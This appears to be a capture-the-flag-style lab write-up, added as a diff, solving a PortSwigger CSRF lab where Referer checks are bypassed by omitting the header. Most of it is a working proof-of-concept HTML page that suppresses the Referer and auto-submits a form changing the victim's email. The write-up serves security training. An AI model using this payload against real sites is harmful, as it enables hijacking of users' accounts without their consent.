@@ -1,0 +1,29 @@
+Lab #11: CSRF where Referer validation depends on header being present
+
+
+Target:  changes the victim's email address
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.
+
+Analysis:
+
+
+   There is a csrf vulnerability in change email and no csrf token is provided.
+
+   CSRF prevention is through the referer http header. 
+   so the attack script:
+
+   <html>
+        <head>
+        <meta name="referrer" content="no-referrer">
+        </head>                  
+        <body>
+                        <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
+                            <input type="hidden" name="email" value="pwned1@evil-user.net" />
+                        </form>
+                        <script>
+                            document.forms[0].submit();
+                        </script>
+        </body>
+    </html>
+
